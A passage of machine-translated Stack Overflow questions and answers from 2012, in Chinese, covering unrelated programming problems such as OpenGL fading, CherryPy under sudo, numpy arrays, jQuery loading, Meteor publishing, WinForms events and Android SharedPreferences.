我一直在尝试制作一个功能，一旦玩家死亡，它就会慢慢变黑。我已经完成了所有设置（淡入淡出等），但我不知道如何制作 OpenGL 颜色蒙版或实际将屏幕淡入黑色所需的任何东西。

我曾尝试使用 glClearColor，然后使用 glClear，但结果完全是黑色的。我知道*技术上*可以通过动态编辑代码的每个颜色属性来做到这一点，但我想知道是否有更简单的方法。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T02:47:51.917

一种简单的方法可能是在绘制完其他所有内容之后在整个视口上绘制一个四边形。您可以使用 alpha 值将其绘制为黑色，并使用混合函数让 alpha 值确定要使用多少黑色。您可能希望禁用深度测试。

# iphone - iOS 模拟器未正确显示对象 - xcode 4.5.2 和 iOS 模拟器 6.0

> ID：13537768
> 
> 赞同：0
> 
> 时间：2012-11-24T02:40:28.933
> 
> 标签：iphone, ios, xcode, simulator

![在此处输入图像描述](../Images/76a934553202ac960799eb81e74b5f6f.png)

正如您在我上传的图片中看到的那样，这基本上是问题所在。

我什至还没有编写任何代码，只有一个带有 2 个按钮和一个标签的基本视图控制器......它在我的故事板中以某种方式显示（我想要的方式），但是当它运行时如您在 iOS 模拟器中所见，显示不正确。为什么会发生这种情况或如何纠正它？

谢谢，

R

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-24T02:43:57.293

您的故事板采用 iPhone 5（4 英寸）布局，模拟器以 3.7 英寸模式运行。您可以在情节提要编辑器中切换设置以查看它在两种模式下的外观，并确保您设置了定位规则，以便它对两种模式都动态工作。

# cherrypy - 为什么使用 sudo 运行 CherryPy 有时会在按 Ctrl-C 终止时挂起？

> ID：13537770
> 
> 赞同：0
> 
> 时间：2012-11-24T02:40:39.853
> 
> 标签：cherrypy

我发现当我使用 sudo 启动 CherryPy 服务器，然后尝试通过按 Ctrl-C 来终止它时，它有时（大约 1/3 的时间）会挂起。我可以使用 CherryPy hello world 重现这个：

```
import cherrypy
class HelloWorld(object):
    def index(self):
        return "Hello World!"
    index.exposed = True

cherrypy.quickstart(HelloWorld()) 
```

我看到的输出是：

```
$ sudo python hello.py 
[23/Nov/2012:21:23:03] ENGINE Listening for SIGHUP.
[23/Nov/2012:21:23:03] ENGINE Listening for SIGTERM.
[23/Nov/2012:21:23:03] ENGINE Listening for SIGUSR1.
[23/Nov/2012:21:23:03] ENGINE Bus STARTING
CherryPy Checker:
The Application mounted at '' has an empty config.

[23/Nov/2012:21:23:03] ENGINE Started monitor thread 'Autoreloader'.
[23/Nov/2012:21:23:03] ENGINE Started monitor thread '_TimeoutMonitor'.
[23/Nov/2012:21:23:04] ENGINE Serving on 127.0.0.1:8080
[23/Nov/2012:21:23:04] ENGINE Bus STARTED
^CTraceback (most recent call last):
  File "hello.py", line 7, in <module>
    cherrypy.quickstart(HelloWorld())
  File "/usr/local/lib/python2.7/site-packages/CherryPy-3.2.2-py2.7.egg/cherrypy/__init__.py", line 161, in quickstart
    engine.block()
  File "/usr/local/lib/python2.7/site-packages/CherryPy-3.2.2-py2.7.egg/cherrypy/process/wspbus.py", line 303, in block
    except (KeyboardInterrupt, IOError):
KeyboardInterrupt
<No subsequent command prompt> 
```

这对我来说是个问题，因为我想在端口 80 上运行我的服务器，并且我在其他线程中发生了一些应该正确清理的事情。我想这主要是调试的麻烦，但我还是很好奇。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T11:23:56.550

我用 CherryPy 打开了一个关于这个的问题。原来问题是我使用的 sudo 版本（1.7.4）：

[https://bitbucket.org/cherrypy/cherrypy/issue/1186/sometimes-hangs-when-running-with-sudo-and](https://bitbucket.org/cherrypy/cherrypy/issue/1186/sometimes-hangs-when-running-with-sudo-and)

我用最新的（1.8.6p3）重新测试，不再有这个问题。感谢克里斯·贝尔比！

# python - 如何增加 numpy int32 数组的维度？

> ID：13537772
> 
> 赞同：4
> 
> 时间：2012-11-24T02:41:19.353
> 
> 标签：python, arrays, numpy, reshape

`a`我有一个名为shape的 numpy int32 数组`(4, 8, 3)`。我想将此数组重塑为 size 的数组`(4, 12, 3)`。我怎么做？

我尝试过使用`reshape`，但`reshape`要求数组大小相同。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T02:52:08.900

我可能错了，但是：一个 numpy 数组不应该以这种方式发生突变。当您进行重塑时，您实际上在做的只是更改读取字节/元素的顺序/方式

您要做的是创建一个更大的新数组，其中包含前一个数组的数据以及其他内容。你必须告诉 Numpy 你想要新东西在哪里以及你想要旧东西在哪里。

IE：

```
new_array = np.zeros((4, 12, 3))
new_array[:, :8, :] = old_array 
```

此示例在第二维末尾的数组上添加 4 个附加“列”。

# javascript - Unicode 三角形旋转

> ID：13537773
> 
> 赞同：0
> 
> 时间：2012-11-24T02:41:27.277
> 
> 标签：javascript, html, css, css-transitions, css-transforms

我试图让 unicode 三角形 (▵) 在页面加载和用户悬停在跨度上时旋转 360 度。我已经建立了一个[jsFiddle 来](http://jsfiddle.net/W8zRX/2/)解释我想要什么。

> ```
> <span id="header">ULTR<span id="triangle">&#9653;</span></span> 
> ```

我对 CSS3 和 webkit 转换知之甚少，无法在页面重新加载时进行旋转/重置。

一个示例演示是 Robin Sloan 在顶部的 x：robinsloan.com，上面写着“嗨：我是 Robin Sloan，加利福尼亚的作家 × 媒体发明家。” 在上面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T02:52:33.550

> 问题是我不知道足够的 CSS3 和 webkit 转换，并且我不知道如何在页面重新加载时进行旋转/重置。

好吧，这就是谷歌的目的。以下是悬停时的操作方法，我相信您可以在页面加载时找到操作方法：

```
#triangle {
  display: inline-block;
  transition: all .5s ease-in-out;
}

#header:hover #triangle {
  transform: rotateZ(360deg);
} 
```

**演示：http:** [//jsfiddle.net/W8zRX/10/](http://jsfiddle.net/W8zRX/10/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T03:02:36.653

试试这个，它会在悬停跨度时旋转三角形：

```
<style type="text/css">
#spinner {
   display:inline-block;
   transition: transform 2s ease 0s;
   transform-origin: 52% 58%;
}
.spin {
   transform: rotate(270deg);
}
</style>
<script type="text/javascript">
function pageLoad() {
   var d = document.getElementById('spinner');
   d.onmouseover = function() {
      d.className = 'spin';
   }
   d.onmouseout = function() {
      d.className = '';
   }
 }
</script>
</head>
<body onload="pageLoad();">
  <span id="spinner">&#9653;</span>
</body> 
```

# jquery - 确保 jquery .load 内容已完成加载

> ID：13537774
> 
> 赞同：0
> 
> 时间：2012-11-24T02:41:29.603
> 
> 标签：jquery, load

我正在通过 jquery .load 动态加载一些 html 内容。我很难确保所有内容都已加载。文本的动态加载似乎工作正常，这是我遇到问题的 html 内容的加载。

这是页面，如果你点击蓝色盾牌，左下角的图片你可以看到它没有动画到全高[http://www.klossal.com/](http://www.klossal.com/)但是如果你看这里你可以看到它是如何加载的它的工作原理是因为它没有动态加载[http://www.klossal.com/index_backup.html](http://www.klossal.com/index_backup.html)

这是加载 html 的脚本的一部分

```
$('#images').load(id +".html", function() {

console.log('Loaded'); //Testing Purposes Only
IMG=1; // Loaded
animate_section(); // Attempt Animation 

}); 
```

这是总共的脚本：

```
var a1, a2, a3, a4, IMG;

$(".thumb_container_site").click(function() {

a1=0; //Reset the Loading Variables
a2=0;
a3=0;
a4=0;
IMG=0;

var id = $(this).attr('id');

$('#images').load(id +".html", function() {

console.log('Loaded'); //Testing Purposes Only
IMG=1; // Loaded
animate_section(); // Attempt Animation 

});

$("#info_header").load(id +"_header.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a1=1; // Loaded
animate_section(); // Attempt Animation         

});

$("#content_1").load(id +"_1.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a2=1; // Loaded
animate_section(); // Attempt Animation         

});

$("#content_2").load(id +"_2.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a3=1; // Loaded
animate_section(); // Attempt Animation         

});

$("#content_3").load(id +"_3.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a4=1; // Loaded
animate_section(); // Attempt Animation         

});

}); 
```

我能得到的任何帮助都会很棒，谢谢。

这是动画功能

```
function animate_section() {

if((a1===1) && (a2===1) && (a3===1) && (a4===1) && (IMG===1)){ //Animate if all thre divs are loaded

$("#top_section").animate({
    height: $("#load_container").outerHeight(true) + 30
}, 300);
$("#grid").animate({
    marginTop: $("#load_container").outerHeight(true) + 300,
    paddingBottom: 300
}, 300);   
}                
} 
```

还有一个稍微不同的加载结构的第二个函数，但我认为这不会破坏任何东西。这个函数加载左上角的缩略图内容，加载完全正确，

```
$(".thumb_container_img").click(function() {

a1=0; //Reset the Loading Variables
a2=0;
a3=0;
a4=0;
IMG=0;

var id = $(this).attr('id');

$('#images').empty();

$("<img>", { src: 'http://www.klossal.com/' + id + ".png" }).load(function () {    
$(this).prependTo("#images"), IMG=1 });

$("#info_header").load(id +"_header.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a1=1; // Loaded
animate_section(); // Attempt Animation         

});

$("#content_1").load(id +"_1.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a2=1; // Loaded
animate_section(); // Attempt Animation         

});

$("#content_2").load(id +"_2.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a3=1; // Loaded
animate_section(); // Attempt Animation         

});

$("#content_3").load(id +"_3.txt", function() {

console.log('Loaded'); //Testing Purposes Only
a4=1; // Loaded
animate_section(); // Attempt Animation         

});

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:53:37.127

在我看来，正在发生的事情是加载文本文件时触发了加载回调，而不是加载图像本身时。因此，您对 outerHeight() 的调用得到了不正确的值，因为容器元素的高度等于当时图像的加载部分。你应该调查把一个

```
$('#load_container img').on('load', function(){
   //callback or emit an event that will listen and then respond with your callback
}); 
```

# meteor - 使用流星列出客户端上的所有用户

> ID：13537777
> 
> 赞同：8
> 
> 时间：2012-11-24T02:42:49.600
> 
> 标签：meteor, coffeescript

根据流星文档，如果安装了 autopublish 包，则应将所有用户发布到所有客户端。

[http://docs.meteor.com/#meteor_users](http://docs.meteor.com/#meteor_users)

我安装了 autopublish 包，但使用`forEach`on`Meteor.users`仅列出当前登录的用户。

有没有更正确的方法通过使用咖啡脚本列出客户端上的所有用户？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-14T11:29:42.420

[以下是 Meteor's Party 示例](https://github.com/meteor/meteor/tree/devel/examples/other/parties)的摘录：

```
// in server.js
Meteor.publish("directory", function () {
  return Meteor.users.find({}, {fields: {emails: 1, profile: 1}});
});

// in client.js
Meteor.subscribe("directory"); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-24T03:27:11.050

如果您在不使用订阅的情况下自动发布用户集合

```
if Meteor.isServer

    Meteor.publish null, ->
        Meteor.users.find {},
            fields:
                username: 1
                profile: 1 
```

如果你想订阅指定用户，你可以

```
if Meteor.isServer

    Meteor.publish 'users-by-selector', (options) ->
        Meteor.users.find options, # options as selector like $in: name: 'john'
            fields: # use fields to only publish specify fields you want to send. 
                username: 1
                profile: 1

if Meteor.isClient

    Meteor.autosubscribe ->
        options = Session.get 'your mongodb selector'
        Meteor.subscribe 'users-by-selector', options, ->
            console.log 'on Subscribe Complete Callback.'
            if Meteor.users.find().count()
                Session.set 'specifyUsersLoaded', true 
```

# c# - 使用asp.net 4.0通过gmail发送电子邮件'操作已超时'

> ID：13537778
> 
> 赞同：1
> 
> 时间：2012-11-24T02:43:24.033
> 
> 标签：c#, asp.net, email, smtp, gmail

> **可能重复：**
> [使用 C# 通过 Gmail SMTP 服务器发送电子邮件](https://stackoverflow.com/questions/704636/sending-email-through-gmail-smtp-server-with-c-sharp)

下面是一个按钮点击触发的asp代码。我正在使用 Windows 7 家庭高级版。我收到错误“操作已超时”也尝试了端口 587，但收到错误“SMTP 服务器需要安全连接或客户端未通过身份验证。'

```
 public void SendEmailFromCommAgent(string subject, string body, string to)
    {

        try
        {
            SmtpClient mc = new SmtpClient("smtp.gmail.com",465);
            MailMessage msg = new MailMessage("xxxxxxx@gmail.com", to, subject, body);
            mc.EnableSsl = true;
            mc.UseDefaultCredentials = false;
            mc.Credentials = new System.Net.NetworkCredential("xxxxxxxxxxxx@gmail.com", "xxxxxxxxxxxxxxx");
            msg.From = new MailAddress("xxxxxxxxxxx@gmail.com");
            mc.DeliveryMethod = SmtpDeliveryMethod.Network;
            mc.Timeout = 50000;
            msg.IsBodyHtml = true;

            mc.Send(msg);
        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
    } 
```

IIS 配置电子邮件地址：xxx@gmail.com smtp 服务器：smtp.gmail.com 端口：465 指定凭据：用户名 xxxxx@gmail.com 密码 xxxxxxx

任何帮助都会很棒:)

# html - 设计固定布局表

> ID：13537779
> 
> 赞同：0
> 
> 时间：2012-11-24T02:43:25.607
> 
> 标签：html, css, html-table

我正在尝试构建一个 3 个固定列的表，左右列应为 47px 宽，中间列应使用剩余空间。这是我所做的：

HTML：

```
<table class='table poem'>
<tr>
    <td colspan="3">
        <span id="title">
            <h3 class='hide center'>Beautiful Poem</h3>
        </span>
    </td>
</tr>
<tr class="verse">
    <td style='vertical-align: middle; text-align: right;'>
        <img src="{{ asset('bundles/yopyourownpoet/images/showPoem/Transparent.png') }}" alt="" height="33" width="47" />
    </td>
    <td>
        <div class='verse'>
            <div class='hide intro'>Here's the special poem for them.</div>
            <div class='hide intro'>Give to them just like a gem.</div>
            <div class='hide intro'>But if you like, I'll change verse.</div>
            <div class='hide intro'>Click an arrow, need not rehearse.</div>
            <div class='hide intro'>When it's ready, click the star. </div>
        </div>
    </td>
    <td style='vertical-align: middle;'>
        <a href= {{ links.changeIntro }}>
            <img src="{{ asset('bundles/yopyourownpoet/images/showPoem/NextVerse.png') }}" alt="Next Intro" height="33" width="47" />
        </a>
    </td>
</tr> 
```

CSS：

```
table.poem { table-layout: fixed; }
tr.verse { width: 100%; }
tr.verse > td:nth-child(1) { width: 47px; }
/*tr.verse > td:nth-child(2) { width: 70%; }*/
tr.verse > td:nth-child(3) { width: 47px; }
#title, #closing, #ps { min-height: 50px; width: 100%; }
div.verse
{
    text-align: center;
    min-height: 180px;
    width: 100%;
    white-space: nowrap;
    overflow: hidden;
} 
```

[这](http://jsfiddle.net/Marronsuisse/YB9EG/)是一个jsFiddle。

但是，表格分为等宽的 3 列。我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T05:50:06.140

你可以用这个

```
 <div style="width=100%; margin-left:auto; margin-right:auto;"> 
        <div  style="width=40%; margin-left:auto; margin-right:auto;float:left;">
        </div>
        <div  style="width=40%; margin-left:auto; margin-right:auto; float:right;">
        </div>
    </div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T06:49:03.657

如果您正在创建一个非常大的表，那么`table-layout: fixed;`这是一个好主意，因为浏览器只需要读取第一行即可计算和呈现整个表，因此加载速度更快。

但如果没有，您可以使用`table-layout`默认值并设置`width:100%;`为表格或您需要的任何固定宽度：

```
table.poem { 
   border-collapse: collapse;
   width: 100%; 
}
td{
   border: 1px solid #000;
}
tr.verse { width: 100%; }
tr.verse > td:nth-child(1) { width: 47px; }
tr.verse > td:nth-child(3) { width: 47px; }
#title, #closing, #ps { 
   min-height: 50px; 
   width: 100%; 
}
div.verse
{
    text-align: center;
    min-height: 180px;
    white-space: nowrap;
    overflow: hidden;
} 
```

这是[小提琴](http://jsfiddle.net/YB9EG/2/)

### 建议：

*   您可以在不使用表格的情况下执行此操作，这是一个简单的 3 列布局
*   避免使用选择器`nth-child`，这样很好，但与旧浏览器不兼容（例如：IE8）
*   您可以替换一堆`<div class='hide intro'>`换行符或使用 span 代替

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T02:44:15.270

`<colgroup>`我终于设法通过在我的表中添加和`<col>`标签来获得所需的效果（在页面加载时使表和列具有正确的固定尺寸） ：

```
<table class='table poem'>
    <colgroup>
        <col width=47px>
        <col width=100%>
        <col width=47px>
    </colgroup>
    <tr>
        <td colspan="3">
            <div id="title">
                <h3 class='hide center'>{{ poem.poemTitle }}</h3>
            </div>
        </td>
    </tr>
    <tr class="verse">
        <td>
            <img src="{{ asset('bundles/yopyourownpoet/images/showPoem/Transparent.png') }}" alt="" height="33" width="47" />                
        </td>
        <td>
            <div class='verse'>
                <div class='hide intro'>{{ poem.introLine1 }}</div>
                <div class='hide intro'>{{ poem.introLine2 }}</div>
                <div class='hide intro'>{{ poem.introLine3 }}</div>
                <div class='hide intro'>{{ poem.introLine4 }}</div>
                <div class='hide intro'>{{ poem.introLine5 }}</div>
            </div>
        </td>

    </tr>
    <tr>
       <td>
           <a href= {{ links.changeIntro }}>
           <img src="{{ asset('bundles/yopyourownpoet/images/showPoem/NextVerse.png') }}" alt="Next Intro" height="33" width="47" />
           </a>
       </td>
    </tr>
</table> 
```

CSS：

```
table.poem { table-layout: fixed; width: 100%; }
tr.verse { width: 100%; }
tr.verse > td { vertical-align: middle; }
#title, #closing, #ps { min-height: 50px; width: 100%; }
#closing { padding-top: 25px; font-size: 120%; }
#ps { font-style: italic; font-size: 120%; }
div.verse
{
    text-align: center;
    min-height: 180px;
    width: 100%;
    white-space: nowrap;
    overflow: hidden;
} 
```

# c# - 使用两种形式进行缩放

> ID：13537782
> 
> 赞同：4
> 
> 时间：2012-11-24T02:43:41.040
> 
> 标签：c#, zooming, picturebox, trackbar

我的项目中有多种形式。Form1 包含一个显示 jpeg 的图片框。在 Form2 中，我有一个 trackBar，我想控制 Form1 中图像的缩放级别。为了简单起见，我只需要 2 或 3 个缩放级别。我已在设计器视图中将图片框设置为公共。但是，当我尝试在 Form2 中引用图片框时，它说它不存在。下面是我用来在 Form1 中调用 Form2 的代码

```
Form2 dataWindow = new Form2();
dataWindow.ShowDialog(); 
```

简而言之，我需要帮助的两件事是：

1) 从单独的窗体中更改图片框1 的属性。2) 创建一个简单的缩放公式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T04:02:06.180

允许其他类修改表单的内部控件被认为是糟糕的设计。表单应该对它的所有组件负责。你永远不应该公开任何内部控制。子表单引用父表单也被认为是不好的做法。

解决这个问题的适当方法是通过事件。子窗体`Form2`应该定义一个公共事件：

```
public event Action<int> TrackBarMoved; 
```

`Form2`可以在移动轨迹栏时触发该事件，并将轨迹栏的位置作为参数传递（如果传递其他内容有意义，例如缩放级别或您想要的任何其他内容，那也可以）。

`Form1`可以在创建该事件时订阅该事件，并根据轨迹栏的位置`From2`更改图片的缩放（内部，从内部）。`Form1`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T02:59:02.310

1) 将 form1 引用传递给 form2 的构造函数：

```
Form2 dataWindow = new Form2(this);
dataWindow.Show(); 
```

...

```
private form1 as Form1;
public Form2(Form1 frm1)
{
  form1 = frm1;
} 
```

然后在 Form2s TrackBar_Scroll 事件中通过私有成员变量 form1 引用 PictureBox：`form1.PictureBox1.Property`

2)[使用 PictureBox 放大您的图片，以便您可以使用鼠标滚轮进行缩放](http://blogs.msdn.com/b/calvin_hsia/archive/2008/08/21/8885657.aspx)

* * *

更好的方法是事件：

```
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        var form2 = new Form2();
        form2.TrackBarMoved += new Action<int>(ZoomPictureBox);
        form2.ShowDialog();
        form2.TrackBarMoved -= new Action<int>(ZoomPictureBox);

    }

    private void ZoomPictureBox(int zoomFactor)
    {
        pictureBox1.Width = 100 * zoomFactor;
        pictureBox1.Height = 100 * zoomFactor;
    }
}

public partial class Form2 : Form
{
    public Form2()
    {
        InitializeComponent();
    }

    public event Action<int> TrackBarMoved;

    private void trackBar1_Scroll(object sender, EventArgs e)
    {
        TrackBarMoved(trackBar1.Value);
    }
} 
```

# jquery - 附加到动态 iframe - jQuery - 在 Firefox 中不起作用

> ID：13537784
> 
> 赞同：2
> 
> 时间：2012-11-24T02:44:00.533
> 
> 标签：jquery, iframe, append

火狐 16/17

以下代码是我编写的用于打印元素的 jquery 插件。

这在 Firefox 中有效，但现在只显示一个空白页面，头部和正文都保持空白。这适用于 IE 和 Chrome。

github： [https ://github.com/jasonday/jquery.printThis](https://github.com/jasonday/jquery.printThis)

演示：http: [//jsfiddle.net/jasonday/Tx4Uv/12/](http://jsfiddle.net/jasonday/Tx4Uv/12/)

代码：

```
(function($) {
    var opt;

    $.fn.printThis = function (options) {
        opt = $.extend({}, $.fn.printThis.defaults, options);

        var $element = (this instanceof jQuery) ? this : $(this);

    // if Opera, open a new tab
        if ($.browser.opera)
        {
            var tab = window.open("","Print Preview");
            tab.document.open();

            var doc = tab.document;
        }
    // add dynamic iframe to DOM
        else
        {
        var strFrameName = ("printThis-" + (new Date()).getTime());

            var $iframe = $("<iframe id='" + strFrameName +"' src='about:blank'/>");

            if (!opt.debug) { $iframe.css({ position: "absolute", width: "0px", height: "0px", left: "-600px", top: "-600px" }); }

            $iframe.appendTo("body");

            var $doc = $("#" + strFrameName).contents();
        }
    // allow iframe to fully render before action
    setTimeout ( function () {

        // import page css
        if (opt.importCSS)
        {
                $("link[rel=stylesheet]").each(function(){
                var href = $(this).attr('href');
                if(href){
                        var media = $(this).attr('media') || 'all';
                        $doc.find("head").append("<link type='text/css' rel='stylesheet' href='" + href + "' media='"+media+"'>");
                    }
        });
        }

        // add another stylesheet
        if (opt.loadCSS)
        {
        $doc.find("head").append("<link type='text/css' rel='stylesheet' href='" + opt.loadCSS + "'>");

        }

        //grab outer container
        if (opt.printContainer) { $doc.find("body").append($element.outer()); }
        else { $element.each( function() { $doc.find("body").append($(this).html()); }); }

        //$doc.close();
        // print
        ($.browser.opera ? tab : $iframe[0].contentWindow).focus();
        setTimeout( function() { ($.browser.opera ? tab : $iframe[0].contentWindow).print(); if (tab) { tab.close(); } }, 1000);

        //removed iframe after 60 seconds
        setTimeout(
        function(){
        $iframe.remove();
        },
        (60 * 1000)
        );
    }, 333 );
    }

    $.fn.printThis.defaults = {
        debug: false, //show the iframe for debugging
        importCSS: true, // import page CSS
        printContainer: true, // grab outer container as well as the contents of the selector
        loadCSS: "" //path to additional css file
    };

    jQuery.fn.outer = function() {
      return $($('<div></div>').html(this.clone())).html();
    }
})(jQuery); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T04:06:29.527

修复已实施。

移到解决问题的`$doc`内部。`setTimeout function`

```
 setTimeout ( function () {

        if ($.browser.opera)
            {
        var $doc = tab.document;
        } else
        {
        var $doc = $("#" + strFrameName).contents();
        }
... 
```

代码也在 github 上更新。

# node.js - 莫吉托安装错误

> ID：13537791
> 
> 赞同：2
> 
> 时间：2012-11-24T02:45:07.287
> 
> 标签：node.js, mojito

在带有节点 0.6.19 和 NPM v 1.1.4 的 Ubuntu 12.10 上，当我尝试从 NPM 源和克隆的 GitHub 作为 root (sudo) 安装时收到以下消息：

```
npm ERR! error installing js-yaml@1.0.2
npm ERR! error installing mojito@0.4.9-2
npm ERR! Error: ENOENT, chmod '/usr/local/lib/node_modules/mojito/node_modules/___yuidocjs.npm/package/tests/out/files/input_charts_StackedAreaSeries.js.html'
npm ERR! You may report this log at:
npm ERR!     <http://bugs.debian.org/npm>
npm ERR! or use
npm ERR!     reportbug --attach /home/me/devpath/mojito/npm-debug.log npm
npm ERR! 
npm ERR! System Linux 3.5.0-17-generic
npm ERR! command "/usr/bin/nodejs" "/usr/bin/npm" "install" "-g" "mojito"
npm ERR! cwd /home/me/devpath/mojito
npm ERR! node -v v0.6.19
npm ERR! npm -v 1.1.4
npm ERR! path /usr/local/lib/node_modules/mojito/node_modules/___yuidocjs.npm/package   /tests/out/files/input_charts_StackedAreaSeries.js.html
npm ERR! fstream_path /usr/local/lib/node_modules/mojito/node_modules/___yuidocjs.npm   /package/tests/out/files/input_charts_StackedAreaSeries.js.html
npm ERR! fstream_type File
npm ERR! fstream_class FileWriter
npm ERR! fstream_finish_call chmod
npm ERR! code ENOENT
npm ERR! message ENOENT, chmod '/usr/local/lib/node_modules/mojito/node_modules/___yuidocjs.npm/package/tests/out/files/input_charts_StackedAreaSeries.js.html'
npm ERR! errno {}
npm ERR! fstream_stack Object.oncomplete (/usr/lib/nodejs/fstream/lib/writer.js:285:17)

npm ERR! Error: ENOENT, chmod '/usr/local/lib/node_modules/mojito/node_modules/js-yaml/bin/js-yaml.js'
npm ERR! You may report this log at:
npm ERR!     <http://bugs.debian.org/npm>
npm ERR! or use
npm ERR!     reportbug --attach /home/me/devpath/mojito/npm-debug.log npm
npm ERR! 
npm ERR! System Linux 3.5.0-17-generic
npm ERR! command "/usr/bin/nodejs" "/usr/bin/npm" "install" "-g" "mojito"
npm ERR! cwd /home/me/devpath/mojito
npm ERR! node -v v0.6.19
npm ERR! npm -v 1.1.4
npm ERR! path /usr/local/lib/node_modules/mojito/node_modules/js-yaml/bin/js-yaml.js
npm ERR! code ENOENT
npm ERR! message ENOENT, chmod '/usr/local/lib/node_modules/mojito/node_modules/js-yaml/bin/js-yaml.js'
npm ERR! errno {}
npm ERR! 
npm ERR! Additional logging details can be found in:
npm ERR!     /home/me/devpath/mojito/npm-debug.log
npm not ok 
```

我不知所措。为什么我会得到一个 sudo 的 chmod 错误？我从这里去哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T18:54:41.193

在过去的一个小时里，我一直在处理同样的问题。尽管我发现很多人报告了相同的错误，但我仍然不知道确切的问题是什么。该问题似乎与您拥有的 npm 版本有关。我做了这些步骤来解决这个问题：

1) 更新节点。

2) 更新了 npm。（须藤 npm 安装 -g npm）

3）清除缓存。（须藤 npm 清除缓存）

# android - SharedPreferences 没有像我预期的那样工作

> ID：13537792
> 
> 赞同：2
> 
> 时间：2012-11-24T02:45:10.547
> 
> 标签：android, properties, sharedpreferences

我遇到了共享首选项的问题。它没有像我预期的那样工作。登录我的应用程序后，我在共享首选项中存储了一个 ID（谷歌 ID）。在随后的活动（大约 3 个活动之后）中，我尝试检索 id 但它为空。如果它很重要，我正在尝试在 onClickListener （从按钮）中检索共享首选项。我不确定我做错了什么。任何帮助，将不胜感激。

我如何设置它：

```
 public void setLoginPreferences(String id){

    SharedPreferences.Editor editor = getPreferences(MODE_PRIVATE).edit();
    editor.putString(Constants.ID_KEY_NAME, id);
    editor.commit();
} 
```

我如何尝试得到它：

```
 //setup clickListener for Sumbit Comment
    Button submitButton = (Button) findViewById(R.id.submitComment);
    submitButton.setOnClickListener(new OnClickListener(){

        @Override
        public void onClick(View v) {
           //myContext is a global variable set on the onCreate of the activity
            SharedPreferences prefs = myContext.getPreferences(MODE_PRIVATE);
            String userId = prefs.getString(Constants.ID_KEY_NAME, null);   
            SetConcertCommentAsynchWebservice scca = new SetConcertCommentAsynchWebservice(myContext,concertId,userId,Float.toString(soundRatingBar.getRating()),Float.toString(showRatingBar.getRating()),userSubmittedComments.getText().toString()); 
        }});
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T02:51:06.277

如果您想在其他地方访问它们，您可能想要使用`context.getSharedPreferences()`而不是。`context.getPreferences()`

# c# - 在内存对象和数据库中使用 Any() 进行 Linq 查询

> ID：13537797
> 
> 赞同：0
> 
> 时间：2012-11-24T02:47:10.427
> 
> 标签：c#, linq

> **可能重复：**
> [在此上下文中仅支持原始类型（“例如 Int32、String 和 Guid”）](https://stackoverflow.com/questions/6539237/only-primitive-types-such-as-int32-string-and-guid-are-supported-in-this-c)

好的，所以我有一个 user 表和一个 users_users 表，它们基本上只是将 2 个用户联系在一起。

我的实体框架在模型中没有 users_users，它仅显示为主要用户对象的关系/属性。这种关系显示为 u.user1

所以 u.user1 是用户的集合，它们存在于 users_users 表中。这很棒但是..

我正在尝试创建一个查询，我可以在其中从用户表中选择所有用户，并在 select 子句中创建一个布尔变量（在下面的代码中添加），该变量将显示是否存在 user_user 连接的记录。

我收到错误“无法创建类型只有原始类型的常量值”

我知道在选择中使用“Any()”命令时，我不能将内存中的对象与 Linq 查询一起使用，那么我将如何去做呢？我是 LINQ 的新手。

```
using (myEntities entities = new myEntities())
        {
             Model.user u = entities.users.Single(m => m.emailLogon == System.Web.HttpContext.Current.User.Identity.Name);
             ObjectQuery<Model.user> susers = entities.users;

            var pplquery = (from suser in susers
                            select new { userId = suser.IdUser, FirstName = suser.contactinfo.FirstName, LastName = suser.contactinfo.LastName, added = 
                                u.user1.Any(cusr => cusr.IdUser == suser.IdUser)}).Take(15);

        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:19:05.450

```
using (myEntities entities = new myEntities())
        {
             Model.user u = entities.users.Single(m => m.emailLogon == System.Web.HttpContext.Current.User.Identity.Name);
             var susers = entities.users.ToList();

            var pplquery = (from suser in susers.AsQueryable()
                            select new { userId = suser.IdUser, FirstName = suser.contactinfo.FirstName, LastName = suser.contactinfo.LastName, added = 
                                u.user1.Any(cusr => cusr.IdUser == suser.IdUser)}).Take(15);

        } 
```

将其转换为列表以执行查询，然后您可以从该集合中选择创建新对象。

# android - 更新后保留 SQLite 数据

> ID：13537800
> 
> 赞同：7
> 
> 时间：2012-11-24T02:47:59.537
> 
> 标签：android, sqlite

我有一个带有 3 个表的 sqlite 的应用程序。我担心的是，如果我引入一个添加另一个表（所以是 4 个表）的更新，那么更新的版本将清除数据库。

鉴于备份发生在更新之前和更新之后的恢复，我如何备份/恢复数据库？如果我使用 IO 进行操作（复制到 SD 卡并复制回来），那么它将失败。

我可能正在考虑将数据导出到 xml 并手动加载。还有其他方法吗？关于如何做到这一点的任何例子？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T02:52:34.627

